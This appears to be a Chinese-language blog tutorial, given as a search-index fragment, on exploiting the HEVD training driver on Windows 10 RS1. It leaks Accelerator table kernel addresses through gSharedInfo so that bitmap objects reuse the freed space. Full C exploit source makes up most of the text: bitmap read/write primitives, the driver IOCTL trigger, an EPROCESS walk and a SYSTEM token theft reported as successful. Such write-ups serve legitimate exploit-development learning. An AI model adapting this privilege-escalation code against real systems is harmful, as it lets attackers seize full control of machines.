pvScan0 \u6765\u83b7\u53d6 pvScan0 \u7684\u5730\u5740\u7684\u65b9\u6cd5\u5df2\u7ecf\u884c\u4e0d\u901a\u4e86\uff0c\u90a3\u4e48\u6211\u4eec\u5e94\u8be5\u600e\u4e48\u529e\u5462\uff1f\u8fd9\u65f6\u5019\u5e94\u8be5\u6709\u4e24\u79cd\u601d\u8def 1. \u5bfb\u627e\u5176\u5b83\u65b9\u6cd5\u6765\u6cc4\u9732 bitmap GDI \u5bf9\u8c61\u7684\u5730\u5740 2. \u5bfb\u627e bitmap \u7684\u66ff\u4ee3\u65b9\u6848 \u770b\u5230\u8fd9\u5c0f\u8282\u7684\u6807\u9898\u5e94\u8be5\u5c31\u53ef\u4ee5\u77e5\u9053\u672c\u7bc7\u6587\u7ae0\u91c7\u7528\u7684\u662f\u7b2c\u4e00\u79cd\u601d\u8def\u4e86\u3002 \u6211\u4eec\u77e5\u9053\uff0c\u5728 Windows \u4e2d\u5b58\u5728\u7740 3 \u79cd\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u5206\u522b\u4e3a user object\u3001GDI object\u3001Kernel object\uff0c\u4e00\u5171\u6709 40 \u591a\u79cd\u5bf9\u8c61\u3002 \u56e0\u4e3a\u6ca1\u6709\u505a\u8fc7\u603b\u7ed3\u6211\u4e5f\u4e0d\u6562\u5984\u4e0b\u5b9a\u8bba\uff0c\u4f46\u662f\u50cf\u6211\u4eec\u4e4b\u524d\u7528\u5230\u7684 Event \u5bf9\u8c61\u5c5e\u4e8e Kernel object\uff0c\u5b58\u5728\u4e8e\u975e\u6362\u9875\u6c60\u4e2d\uff0cbitmap \u5bf9\u8c61\u5c5e\u4e8e GDI object\uff0c\u5b58\u5728\u4e8e\u6362\u9875\u4f1a\u8bdd\u6c60\u4e2d\uff0c\u7136\u540e\u5c31\u662f\u8fd9\u6b21\u6211\u4eec\u8981\u7528\u7684 Accelerator table \u5bf9\u8c61\uff0c\u5c5e\u4e8e user object\uff0c\u4e5f\u5b58\u5728\u4e8e\u6362\u9875\u4f1a\u8bdd\u6c60\u4e2d\u3002 \u65e2\u7136 Accelerator table \u5bf9\u8c61\u548c bitmap \u5bf9\u8c61\u90fd\u5b58\u5728\u4e8e\u6362\u9875\u4f1a\u8bdd\u6c60\u4e2d\uff0c\u90a3\u4e48\u5047\u8bbe\u6211\u4eec\u6709\u529e\u6cd5\u83b7\u5f97\u6bcf\u4e00\u4e2a Accelerator table \u5bf9\u8c61\u7684\u5730\u5740\u7684\u8bdd\uff0c\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u8ba9 bitmap \u5bf9\u8c61\u91cd\u7528\u6211\u4eec\u91ca\u653e\u6389\u7684 Accelerator table \u5bf9\u8c61\u7684\u7a7a\u95f4\uff0c\u8fd9\u6837\u4e0d\u5c31\u7b49\u540c\u4e8e\u6211\u4eec\u83b7\u5f97\u4e86 bitmap GDI \u5bf9\u8c61\u7684\u5730\u5740\uff0c\u4e5f\u5c31\u7b49\u540c\u4e8e\u83b7\u5f97\u4e86 pvScan0 \u7684\u5730\u5740\u4e86\u5417\uff1f \u4e3a\u6b64\u6211\u4eec\u9700\u8981 1. \u6709\u529e\u6cd5\u83b7\u5f97 Accelerator table \u5bf9\u8c61\u7684\u5730\u5740 2. \u8ba9 bitmap \u5bf9\u8c61\u91cd\u7528\u6211\u4eec\u91ca\u653e\u6389\u7684 Accelerator table \u5bf9\u8c61\u7684\u7a7a\u95f4 \u83b7\u5f97 Accelerator table \u5bf9\u8c61\u7684\u5730\u5740 \u5728 user32.dll \u6a21\u5757\u4e2d\u6709\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\u53eb\u505a gSharedInfo\uff0c\u5b83\u7684\u7ed3\u6784\u4e3a \u5b83\u7684\u7b2c\u4e8c\u4e2a\u53d8\u91cf aheList \u6307\u5411\u4e00\u5f20\u7ed3\u6784\u4e3a USER_HANDLE_ENTRY \u7684\u8868\uff0cUSER_HANDLE_ENTRY \u7684\u7ed3\u6784\u4e3a \u5176\u4e2d\u7b2c\u4e00\u4e2a\u53c2\u6570 pKernel \u5c31\u50cf GdiSharedHandleTable \u4e2d\u7684 pKernel \u4e00\u6837\uff0c\u6307\u5411\u8be5 user object \u5728\u5185\u6838\u7a7a\u95f4\u4e2d\u7684\u4f4d\u7f6e\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 user object \u7684 handle \u503c\u6765\u7d22\u5f15\u5176\u5728 aheList \u4e2d\u7684\u4f4d\u7f6e\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 gSharedInfo - aheList - pKernel \u6765\u83b7\u53d6 user object \u5728\u5185\u6838\u7a7a\u95f4\u4e2d\u7684\u5730\u5740 \u56e0\u4e3a Accelerator table \u5c5e\u4e8e user object\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u6765\u83b7\u5f97 Accelerator table \u5bf9\u8c61\u7684\u5730\u5740 \u8ba9 bitmap \u5bf9\u8c61\u91cd\u7528\u91ca\u653e\u6389\u7684\u7a7a\u95f4 \u6211\u4eec\u77e5\u9053\uff0c\u5982\u679c\u6211\u4eec\u5728\u6c60\u4e2d\u91ca\u653e\u6389\u4e00\u5757\u7a7a\u95f4\uff0c\u5e76\u4e14\u4e4b\u540e\u5206\u914d\u540c\u7b49\u5927\u5c0f\u7684\u7a7a\u95f4\u65f6\uff0c\u5185\u5b58\u7ba1\u7406\u5668\u662f\u503e\u5411\u4e8e\u5206\u914d\u540c\u4e00\u5757\u7a7a\u95f4\u7ed9\u5b83\u7684\u3002 \u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u7c7b\u4f3c\u4e8e HEVD \u975e\u6362\u9875\u6c60\u6ea2\u51fa\u4e2d pool fengshui \u7684\u65b9\u6cd5\u6765\u63d0\u9ad8\u7a33\u5b9a\u6027\u3002\uff08\u7ecf\u6d4b\u8bd5\u76f4\u63a5\u5206\u914d\u91ca\u653e\u5206\u914d\u5c31\u53ef\u4ee5\u4e86\uff0c\u4f46\u662f\u611f\u89c9\u8fd9\u6837\u505a\u8981\u7a33\u5b9a\u4e00\u4e9b\uff09 0x03 RS1 \u4e0b\u7684\u66ff\u4ee3\u65b9\u6cd5\u5229\u7528 \u9996\u5148\u76f4\u63a5\u8d34\u51fa\u6e90\u7801\uff0c\u7136\u540e\u89e3\u91ca\u4e00\u4e9b\u7ec6\u8282 // bitmapReplace.cpp : Defines the entry point for the console application. // #include stdafx.h #include windows.h #include Psapi.h TCHAR driverName [ 1024 ]; typedef struct _payload { PULONG_PTR what ; PULONG_PTR where ; } Payload , * PPayload ; VOID readOOB ( HBITMAP hManager , HBITMAP hWorker , DWORD64 whereWrite , LPVOID whatWrite , int len ) { SetBitmapBits ( hManager , len , whereWrite ); // set \u5199\u7684\u662f hWorker \u7684 pvScan0 \u7684\u503c // \u901a\u8fc7\u63a7\u5236 hWorker \u7684 pvScan0 \u7684\u503c\u6765\u51b3\u5b9a\u5bf9\u54ea\u5757\u5730\u5740\u8fdb\u884c\u8bfb\u5199 GetBitmapBits ( hWorker , len , whatWrite ); } VOID writeOOB ( HBITMAP hManager , HBITMAP hWorker , DWORD64 whereWrite , LPVOID whatWrite , int len ) { SetBitmapBits ( hManager , len , whereWrite ); SetBitmapBits ( hWorker , len , whatWrite ); } typedef struct _SERVERINFO { DWORD dwSRVIFlags ; DWORD cHandleEntries ; WORD wSRVIFlags ; WORD wRIPPID ; WORD wRIPError ; } SERVERINFO , * PSERVERINFO ; typedef struct _USER_HANDLE_ENTRY { void * pKernel ; union { PVOID pi ; PVOID pti ; PVOID ppi ; }; BYTE type ; BYTE flags ; WORD generation ; } USER_HANDLE_ENTRY , * PUSER_HANDLE_ENTRY ; typedef struct _SHAREDINFO { PSERVERINFO psi ; PUSER_HANDLE_ENTRY aheList ; ULONG HeEntrySize ; ULONG_PTR pDispInfo ; ULONG_PTR ulSharedDelts ; ULONG_PTR awmControl ; ULONG_PTR DefWindowMsgs ; ULONG_PTR DefWindowSpecMsgs ; } SHAREDINFO , * PSHAREDINFO ; DWORD64 getKernelBase () { PVOID driversAddress [ 1024 ]; DWORD cbNeeded ; int cDrivers , i ; int ntoskrnlKernelBase ; // find ntoskrnl.exe kernel base if ( EnumDeviceDrivers ( driversAddress , sizeof ( driversAddress ), cbNeeded ) cbNeeded sizeof ( driversAddress )) { cDrivers = cbNeeded / sizeof ( driversAddress [ 0 ]); for ( i = 0 ; i cDrivers ; i ++ ) { if ( GetDeviceDriverBaseName ( driversAddress [ i ], driverName , 1024 )) { char * lowerName = _strlwr ( driverName ); if ( ! strncmp ( driverName , nt , 2 )) { ntoskrnlKernelBase = i ; break ; } else { if ( i == ( cDrivers - 1 )) { printf ( can t find driver name \\n ); exit ( 0 ); } continue ; } } else { printf ( get device driver name failed \\n ); } } } else { printf ( Enumerate Device Drivers failed \\n ); return 0 ; } printf ( driver name is: %s \\n , driverName ); return ( DWORD64 ) driversAddress [ ntoskrnlKernelBase ]; } DWORD64 getSystemEProcessAddr () { DWORD64 ntoskrnlKernelBase = getKernelBase (); DWORD64 ntoskrnlUserBase = ( DWORD64 ) LoadLibrary ( driverName ); if ( ntoskrnlUserBase == NULL ) { printf ( load library failed! \\n ); return 0 ; } DWORD64 PsInitialSystemProcessUserSpaceAddr = ( DWORD64 ) GetProcAddress (( HMODULE ) ntoskrnlUserBase , PsInitialSystemProcess ); DWORD64 PsInitialSystemProcessKernelSpaceAddr = ntoskrnlKernelBase + ( PsInitialSystemProcessUserSpaceAddr - ntoskrnlUserBase ); return PsInitialSystemProcessKernelSpaceAddr ; } int main () { PUSER_HANDLE_ENTRY leakAddr = NULL ; PSHAREDINFO gSharedInfo = ( PSHAREDINFO ) GetProcAddress ( GetModuleHandle ( user32.dll ), gSharedInfo ); PUSER_HANDLE_ENTRY handleTable = gSharedInfo - aheList ; int nSize = 698 ; LPACCEL lPaccel = NULL ; // LPTR \u610f\u4e3a LMEM_FIXED | LMEM_ZEROINIT\uff0c\u5373\u5206\u914d\u56fa\u5b9a\u5185\u5b58\u5e76\u521d\u59cb\u5316\u4e3a 0 lPaccel = ( LPACCEL ) LocalAlloc ( LPTR , sizeof ( ACCEL ) * nSize ); HACCEL hAccel_1 [ 100 ] = { 0 }; HACCEL hAccel_2 [ 7 ] = { 0 }; for ( int i = 0 ; i 100 ; i ++ ) { hAccel_1 [ i ] = CreateAcceleratorTable ( lPaccel , nSize ); } for ( int i = 0 ; i 7 ; i ++ ) { hAccel_2 [ i ] = CreateAcceleratorTable ( lPaccel , nSize ); } leakAddr = handleTable [ LOWORD ( hAccel_2 [ 2 ])]; DWORD64 hManagerAddr = ( DWORD64 )( leakAddr - pKernel ); //printf( Manager bitmap addr: 0x%p\\n , hManagerAddr); DestroyAcceleratorTable ( hAccel_2 [ 2 ]); HBITMAP hManagerbitmap = CreateBitmap ( 0x710 , 0x2 , 0x1 , 0x8 , NULL ); leakAddr = handleTable [ LOWORD ( hAccel_2 [ 5 ])]; DWORD64 hWorkerAddr = ( DWORD64 )( leakAddr - pKernel ); //printf( Worker bitmap addr: 0x%p\\n , hWorkerAddr); DestroyAcceleratorTable ( hAccel_2 [ 5 ]); HBITMAP hWorkerbitmap = CreateBitmap ( 0x710 , 0x2 , 0x1 , 0x8 , NULL ); for ( int i = 0 ; i 7 ; i ++ ) { if (( i != 2 ) ( i != 5 )) { DestroyAcceleratorTable ( hAccel_2 [ i ]); } } for ( int i = 0 ; i 100 ; i ++ ) { DestroyAcceleratorTable ( hAccel_1 [ i ]); } // ------\u6211\u662f\u5206\u5272\u7ebf------ // \u5230\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97 bitmap \u7684\u5730\u5740\u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u8ddf RS1 \u4e4b\u524d\u4e00\u6837\u5229\u7528 bitmap \u5c31\u597d\u4e86 DWORD64 ManagerpvScan0Address = hManagerAddr + 0x18 + 0x38 ; printf ( Manager pvScan0 Addr: 0x%p \\n , ManagerpvScan0Address ); DWORD64 WorkerpvScan0Address = hWorkerAddr + 0x18 + 0x38 ; printf ( Worker pvScan0 Addr: 0x%p \\n , WorkerpvScan0Address ); PPayload payload = NULL ; // malloc payload = ( PPayload ) HeapAlloc ( GetProcessHeap (), HEAP_ZERO_MEMORY , sizeof ( Payload )); payload - what = ( PULONG_PTR ) WorkerpvScan0Address ; payload - where = ( PULONG_PTR ) ManagerpvScan0Address ; DWORD BytesReturned = 0 ; HANDLE hDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); DeviceIoControl ( hDevice , 0x0022200B , ( LPVOID ) payload , sizeof ( Payload ), NULL , 0 , BytesReturned , NULL ); // \u5df2\u7ecf overwrite \u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u5229\u7528 SetBitmapBits \u548c GetBitmapBits \u6765\u8bfb\u5199 DWORD64 systemEprocessAddr = 0 ; LPVOID lpSystemToken = NULL ; // \u83b7\u53d6 system \u8fdb\u7a0b\u7684 token readOOB ( hManagerbitmap , hWorkerbitmap , getSystemEProcessAddr (), systemEprocessAddr , sizeof ( DWORD64 )); readOOB ( hManagerbitmap , hWorkerbitmap , ( systemEprocessAddr + 0x358 ), lpSystemToken , sizeof ( DWORD64 )); printf ( system eprocess addr: 0x%p \\n , systemEprocessAddr ); // _eprocess + 0x0f8 \u662f token 0x358 // _eprocess + 0x0B8 \u662f ActiveProcessLinks.Flink 0x2f0 // _eprocess + 0x0b4 \u662f processid 0x2e8 // \u83b7\u53d6\u5f53\u524d\u8fdb\u7a0b\u7684 _eprocess DWORD64 lpNextEPROCESS = 0 ; LPVOID lpCurrentPID = NULL ; DWORD64 dwCurrentPID ; LIST_ENTRY lpNextEntryAddreess = { 0 }; DWORD64 currentProcessID = GetCurrentProcessId (); // \u901a\u8fc7PID\u5224\u65ad\u662f\u5426\u83b7\u53d6\u5230\u5f53\u524d\u8fdb\u7a0b\u7684\u5730\u5740 readOOB ( hManagerbitmap , hWorkerbitmap , systemEprocessAddr + 0x2f0 , lpNextEntryAddreess , sizeof ( LIST_ENTRY )); do // \u6839\u636ePID\u662f\u5426\u627e\u5230\u5f53\u524d\u8fdb\u7a0b { // \u83b7\u53d6\u4e0b\u4e00\u4e2a\u8fdb\u7a0b lpNextEPROCESS = ( DWORD64 )(( PUCHAR ) lpNextEntryAddreess . Flink - 0x2f0 ); // \u83b7\u53d6PID readOOB ( hManagerbitmap , hWorkerbitmap , lpNextEPROCESS + 0x2e8 , lpCurrentPID , sizeof ( LPVOID )); dwCurrentPID = LOWORD ( lpCurrentPID ); readOOB ( hManagerbitmap , hWorkerbitmap , lpNextEPROCESS + 0x2f0 , lpNextEntryAddreess , sizeof ( LIST_ENTRY )); } while ( dwCurrentPID != currentProcessID ); DWORD64 currentTokenAddress = ( DWORD64 ) lpNextEPROCESS + 0x358 ; writeOOB ( hManagerbitmap , hWorkerbitmap , currentTokenAddress , lpSystemToken , sizeof ( LPVOID )); system ( whoami \\n ); CloseHandle ( hManagerbitmap ); CloseHandle ( hWorkerbitmap ); return 0 ; } \u9996\u5148\u662f\u5f88\u91cd\u8981\u7684\u4e00\u4e2a\u70b9\uff0csize \u7684\u5927\u5c0f size \u7684\u5927\u5c0f\u4e0d\u80fd\u592a\u5c0f\uff0c\u592a\u5c0f\u7684\u8bdd\u91cd\u7528\u6027\u6781\u4f4e\uff0c\u5373\u4f7f\u4f60\u7528\u4e86 pool fengshui \u6316\u6d1e\u6765\u671f\u5f85\u5185\u5b58\u7ba1\u7406\u5668\u5f80\u6d1e\u4e0a\u91cd\u7528 bitmap \u5bf9\u8c61\uff0c\u4f60\u4f1a\u53d1\u73b0\u91cd\u7528\u6027\u8fd8\u662f\u6781\u4f4e \u5f53\u7136\u592a\u5927\u4e5f\u4e0d\u597d\u3002\u6240\u4ee5\u4f60\u4f1a\u770b\u5230 size \u7684\u503c\u5728 700 \u5de6\u53f3 \u6211\u4eec\u770b\u4e00\u4e0b\u8fd9\u6bb5\u5c0f\u4ee3\u7801 // test2.cpp : Defines the entry point for the console application. // #include stdafx.h #include Windows.h typedef struct _SERVERINFO { DWORD dwSRVIFlags ; DWORD cHandleEntries ; WORD wSRVIFlags ; WORD wRIPPID ; WORD wRIPError ; } SERVERINFO , * PSERVERINFO ; typedef struct _USER_HANDLE_ENTRY { void * pKernel ; union { PVOID pi ; PVOID pti ; PVOID ppi ; }; BYTE type ; BYTE flags ; WORD generation ; } USER_HANDLE_ENTRY , * PUSER_HANDLE_ENTRY ; typedef struct _SHAREDINFO { PSERVERINFO psi ; PUSER_HANDLE_ENTRY aheList ; ULONG HeEntrySize ; ULONG_PTR pDispInfo ; ULONG_PTR ulSharedDelts ; ULONG_PTR awmControl ; ULONG_PTR DefWindowMsgs ; ULONG_PTR DefWindowSpecMsgs ; } SHAREDINFO , * PSHAREDINFO ; int main () { PUSER_HANDLE_ENTRY leakAddr = NULL ; PSHAREDINFO gSharedInfo = ( PSHAREDINFO ) GetProcAddress ( GetModuleHandle ( user32.dll ), gSharedInfo ); PUSER_HANDLE_ENTRY handleTable = gSharedInfo - aheList ; int nSize = 100 ; LPACCEL lPaccel = NULL ; // LPTR \u610f\u4e3a LMEM_FIXED | LMEM_ZEROINIT\uff0c\u5373\u5206\u914d\u56fa\u5b9a\u5185\u5b58\u5e76\u521d\u59cb\u5316\u4e3a 0 lPaccel = ( LPACCEL ) LocalAlloc ( LPTR , sizeof ( ACCEL ) * nSize ); for ( int i = 0 ; i 10 ; i ++ ) { HACCEL hAccel = CreateAcceleratorTable ( lPaccel , nSize ); leakAddr = handleTable [ LOWORD ( hAccel )]; DWORD64 accelAddr = ( DWORD64 )( leakAddr - pKernel ); printf ( accel user object addr: 0x%p \\n , accelAddr ); DestroyAcceleratorTable ( hAccel ); } return 0 ; } \u518d\u770b\u4e00\u4e0b\u5b83\u7684\u6267\u884c\u7ed3\u679c \u8fd9\u7cdf\u7cd5\u7684\u91cd\u7528\u6027\u3002 : ) \u7136\u540e\u5c31\u662f CreateBitmap(0x710, 0x2, 0x1, 0x8, NULL) \u548c int nSize = 698 \u521b\u5efa\u51fa\u6765\u7684 bitmap \u5bf9\u8c61\u548c Accelerator table \u5bf9\u8c61\u7684\u5927\u5c0f\u6b63\u597d\u76f8\u7b49\uff0c\u90fd\u662f 0x1080 byte\uff0c\u4f60\u95ee\u6211\u600e\u4e48\u5f97\u51fa\u6765\u7684\uff1f\u8bd5\u51fa\u6765\u7684 : ) \u5f53\u7136\uff0c\u8fd9\u4e2a\u5927\u5c0f\u5728\u4e0d\u540c\u7684\u73af\u5883\u4e0b\u503c\u53ef\u80fd\u4e0d\u4e00\u6837\uff0c\u6bd4\u5982\u8bf4\u5728 windows 7 x64 \u4e0b\u597d\u50cf\u5c31\u8981\u6bd4\u5728 RS1\uff08windows 10 1607 x64\uff09\u4e0b\u8981\u5c0f\u4e00\u70b9 \u5176\u5b83\u5e94\u8be5\u6ca1\u4ec0\u4e48\u597d\u89e3\u91ca\u7684\u4e86\uff0c\u83b7\u5f97\u5230\u5730\u5740\u4e4b\u540e\u7684\u5229\u7528\u4e0e bitmap \u7684\u5229\u7528\u65b9\u5f0f\u4e00\u6a21\u4e00\u6837\u3002 \u6700\u540e\uff0c\u867d\u7136\u8fd9\u91cc\u7528\u7684\u662f pool fengshui \u7684\u65b9\u6cd5\uff0c\u4f46\u5c31\u50cf\u4e0a\u6587\u8bf4\u5230\u7684\uff0c\u76f4\u63a5\u5206\u914d\u91ca\u653e\u5206\u914d\u4e5f\u53ef\u884c\uff0c\u6bd4\u5982\u4f60\u628a\u5206\u5272\u7ebf\u6ce8\u91ca\u5f80\u4e0a\u7684\u4ee3\u7801\u66ff\u6362\u6210 PUSER_HANDLE_ENTRY leakAddr = NULL ; PSHAREDINFO gSharedInfo = ( PSHAREDINFO ) GetProcAddress ( GetModuleHandle ( user32.dll ), gSharedInfo ); PUSER_HANDLE_ENTRY handleTable = gSharedInfo - aheList ; int nSize = 698 ; LPACCEL lPaccel = NULL ; // LPTR \u610f\u4e3a LMEM_FIXED | LMEM_ZEROINIT\uff0c\u5373\u5206\u914d\u56fa\u5b9a\u5185\u5b58\u5e76\u521d\u59cb\u5316\u4e3a 0 lPaccel = ( LPACCEL ) LocalAlloc ( LPTR , sizeof ( ACCEL ) * nSize ); HACCEL hAccel_1 = NULL ; hAccel_1 = CreateAcceleratorTable ( lPaccel , nSize ); leakAddr = handleTable [ LOWORD ( hAccel_1 )]; DWORD64 hManagerAddr = ( DWORD64 )( leakAddr - pKernel ); //printf( Manager bitmap addr: 0x%p\\n , hManagerAddr); DestroyAcceleratorTable ( hAccel_1 ); HBITMAP hManagerbitmap = CreateBitmap ( 0x710 , 0x2 , 0x1 , 0x8 , NULL ); HACCEL hAccel_2 = NULL ; hAccel_2 = CreateAcceleratorTable ( lPaccel , nSize ); leakAddr = handleTable [ LOWORD ( hAccel_2 )]; DWORD64 hWorkerAddr = ( DWORD64 )( leakAddr - pKernel ); //printf( Worker bitmap addr: 0x%p\\n , hWorkerAddr); DestroyAcceleratorTable ( hAccel_2 ); HBITMAP hWorkerbitmap = CreateBitmap ( 0x710 , 0x2 , 0x1 , 0x8 , NULL ); \u6267\u884c\u8d77\u6765\u4e5f\u662f\u6ca1\u95ee\u9898\u7684\uff0c\u4ee5\u4e0b\u662f\u8fd9\u79cd\u65b9\u6cd5\u7684\u6267\u884c\u7ed3\u679c \u53ef\u4ee5\u770b\u5230\u63d0\u6743\u6210\u529f\u4e86 0x04 \u7ed3\u675f\u8bed \u63a5\u4e0b\u6765\u5b66\u4e60\u4e00\u4e0b\u5728 RS2 \u4e0b\u7684\u5229\u7528 \u9a6c\u4e0a\u56fd\u5e86\u4e86\uff0c\u8981\u662f\u56fd\u5e86\u524d\u6ca1\u66f4\u7684\u8bdd\u5c31\u56fd\u5e86\u540e\u518d\u66f4\u4e86\uff0c\u56fd\u5e86\u800d\u4e00\u800d\uff0c\u6bd5\u7adf 70 \u5468\u5e74\u5e86\u563b\u563b\uff0c\u80af\u5b9a\u8981\u770b\u770b\u9605\u5175\u554a\u5565\u7684\u4e0d\u662f\uff0c\u6700\u8fd1\u8bf4\u7684\u4ee5\u524d\u9605\u5175\u98de\u673a\u98de\u4e24\u904d\u8ba9\u6211\u633a\u611f\u6982\u7684\u3002 \u6700\u540e\uff0c\u795d\u7956\u56fd\u8d8a\u6765\u8d8a\u5f3a\u5927\uff0c\u56fd\u5bcc\u5175\u5f3a\u3002 \uff1a ) 2019.9.26","title":"RS1 \u4e0b bitmap \u7684\u66ff\u4ee3\u65b9\u6cd5"},{"location":"HEVD/bitmapReplace_RS1/#0x00","text":"\u54c8\u55bd\uff0c\u5931\u8e2a\u4eba\u53e3\u56de\u5f52\u4e86\uff0c\u867d\u7136\u4e5f\u6ca1\u4eba\u770b \uff1a ) \u597d\u4e45\u6ca1\u5b66\u4e60\u4e86 \u4e4b\u524d\u4e00\u6bb5\u65f6\u95f4\u6709\u4e9b\u6bd4\u8f83\u91cd\u8981\u7684\u4e8b\u60c5\uff0c\u73b0\u5728\u544a\u4e00\u6bb5\u843d\u4e86 \u5e9f\u8bdd\u4e0d\u591a\u8bf4\uff0c\u56de\u5f52\u6b63\u9898","title":"0x00 \u524d\u8a00"},{"location":"HEVD/bitmapReplace_RS1/#0x01-rs1","text":"\u4e0a\u4e00\u7bc7\u6587\u7ae0\u4e5f\u6709\u63d0\u5230\u8fc7\uff0c\u901a\u8fc7 GdiSharedHandleTable \u6765\u83b7\u53d6 pvScan0 \u7684\u5730\u5740\u7684\u5229\u7528\u65b9\u5f0f\u5728 RS1 \u53ca\u4ee5\u540e\u7684\u7248\u672c\u5df2\u7ecf\u884c\u4e0d\u901a\u4e86\uff0c\u4e3a\u4ec0\u4e48\u5462\uff1f\u8ba9\u6211\u4eec\u770b\u4e00\u4e0b\u8fd9\u6bb5\u5c0f\u4ee3\u7801\u5728 RS1 \u4e0b\u7684\u8fd0\u884c\u60c5\u51b5 // test.cpp : Defines the entry point for the console application. // #include stdafx.h #include windows.h DWORD64 getpvScan0Address ( HBITMAP handle ) { printf ( handle value: 0x%p \\n , ( DWORD64 ) handle ); DWORD64 tebAddr = ( DWORD64 ) NtCurrentTeb (); printf ( tebAddr: 0x%p \\n , tebAddr ); DWORD64 pebAddr = * ( PDWORD64 )(( PUCHAR ) tebAddr + 0x60 ); printf ( pebAddr: 0x%p \\n , pebAddr ); DWORD64 GdiSharedHandleTableAddr = * ( PDWORD64 )(( PUCHAR ) pebAddr + 0x0f8 ); printf ( GdiSharedHandleTableAddr: 0x%p \\n , GdiSharedHandleTableAddr ); // GdiSharedHandleTableAddr \u662f\u4e00\u4e2a\u6307\u5411GDICELL\u7ed3\u6784\u4f53\u6570\u7ec4\u7684\u6307\u9488 // GDICELL \u7ed3\u6784\u4f53 x86 0x10,x64 0x18 DWORD64 pKernelAddress = GdiSharedHandleTableAddr + (( DWORD64 ) handle 0xffff ) * 0x18 ; printf ( pKernelAddress: 0x%p \\n , pKernelAddress ); DebugBreak (); DWORD64 surfaceObject = * ( PDWORD64 ) pKernelAddress ; printf ( surfaceObject address: 0x%p \\n , surfaceObject ); // BASEOBJECT \u7ed3\u6784\u4f53 x86 0x10,x64 0x18 // pvScan0 \u5728 SURFOBJ \u7ed3\u6784\u4f53\u4e2d\u7684\u504f\u79fb x86 0x20,x64 0x38 DWORD64 pvScan0Address = surfaceObject + 0x18 + 0x38 ; printf ( pvScan0 address: 0x%p \\n , pvScan0Address ); DebugBreak (); return pvScan0Address ; } int main () { HBITMAP hBitmap = CreateBitmap ( 0x10 , 0x1 , 0x1 , 0x8 , NULL ); if ( hBitmap == NULL ) { printf ( create bitmap failed \\n ); exit ( 0 ); } getpvScan0Address ( hBitmap ); return 0 ; } \u6211\u4eec\u5148\u770b\u4e00\u4e0b\u5728\u7b2c\u4e00\u4e2a DebugBreak \u65f6\u7684\u5185\u5b58\u60c5\u51b5 \u9898\u5916\u8bdd\uff0c\u8fd9\u91cc\u7684 dq 0x000001cb`da71b640 \u547d\u4ee4\u7684\u7ed3\u679c\u53ef\u80fd\u663e\u793a ????????\uff0c\u770b\u8d77\u6765\u50cf\u662f\u4e00\u5757\u672a\u5206\u914d\u7684\u4e0d\u53ef\u8bfb\u5199\u7684\u5730\u5740\uff0c\u4f46\u4f60\u4f1a\u53d1\u73b0\u5373\u4f7f\u8fd9\u8fb9\u663e\u793a\u7684\u662f ????????\uff0c\u540e\u9762\u7684\u4ee3\u7801\u4e5f\u53ef\u4ee5\u628a\u5730\u5740\u6cc4\u9732\u51fa\u6765\u3002\u6b63\u5e38\u6765\u8bf4\u5bf9\u4e00\u5757 ???????? \u7684\u5730\u5740\u8fdb\u884c\u7c7b\u4f3c DWORD64 surfaceObject = *(PDWORD64)pKernelAddress \u7684\u8bfb\u5199\u64cd\u4f5c\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5e94\u8be5\u4f1a\u5d29\u6e83\u624d\u662f\u3002\u6240\u4ee5\u4e2a\u4eba\u611f\u89c9\u5e94\u8be5\u662f windbg \u7684\u663e\u793a\u95ee\u9898\uff0c\u8fd9\u5757\u5730\u5740\u5e94\u8be5\u662f\u50cf\u56fe\u4e2d\u8fd9\u6837\u6709\u6570\u636e\u7684\u624d\u662f\u3002 \u56de\u5f52\u6b63\u9898\uff0c*(PDWORD64)pKernelAddress \u672c\u6765\u5e94\u8be5\u6307\u5411 surfaceObject\uff0c\u5373\u6211\u4eec\u521b\u5efa\u7684 bitmap GDI \u5bf9\u8c61\u5728\u6362\u9875\u4f1a\u8bdd\u6c60\u4e2d\u7684\u4f4d\u7f6e\uff0c\u4f46\u662f\u770b\u5230\u56fe\u4e2d\uff0c\u4f60\u6709\u6ca1\u6709\u53d1\u73b0\u8fd9\u4e2a\u5730\u5740\u5f02\u5e38\u9ad8\uff1f\u6211\u4eec\u770b\u4e00\u4e0b\u8fd9\u4e2a\u5730\u5740\u7684\u5185\u5b58\u60c5\u51b5 \u6ca1\u9519\uff0c\u539f\u672c\u5e94\u8be5\u6307\u5411 surfaceObject \u7684 *(PDWORD64)pKernelAddress \u6307\u5411\u4e86\u4e00\u5757\u65e0\u610f\u4e49\u7684\u5730\u5740\u3002\u56e0\u6b64 *(PDWORD64)pKernelAddress + 0x18 + 0x38 \u4e5f\u4e0d\u662f\u6211\u4eec\u6240\u8981\u7684 pvScan0 \u7684\u5730\u5740\u4e86\uff0c\u8fd9\u5c31\u662f\u5fae\u8f6f\u5728 RS1 \u4e0b\u5bf9 bitmap \u7684\u5229\u7528\u6240\u8fdb\u884c\u7684\u7f13\u89e3\u63aa\u65bd\u3002 (\u5176\u5b9e\u6211\u603b\u89c9\u5f97\u8fd9\u4e2a *(PDWORD64)pKernelAddress \u662f\u6709\u610f\u4e49\u7684\uff0c\u867d\u7136\u5b83\u4e0d\u76f4\u63a5\u7b49\u4e8e surfaceObject \u7684\u5730\u5740\u4e86\uff0c\u4f46\u662f\u6211\u731c\u6d4b\u53ef\u80fd\u53ef\u4ee5\u901a\u8fc7\u67d0\u79cd\u53d8\u6362\u6765\u5f97\u5230 surfaceObject \u7684\u5730\u5740\uff0c\u6bd5\u7adf\u6bcf\u6b21\u8fd0\u884c *(PDWORD64)pKernelAddress 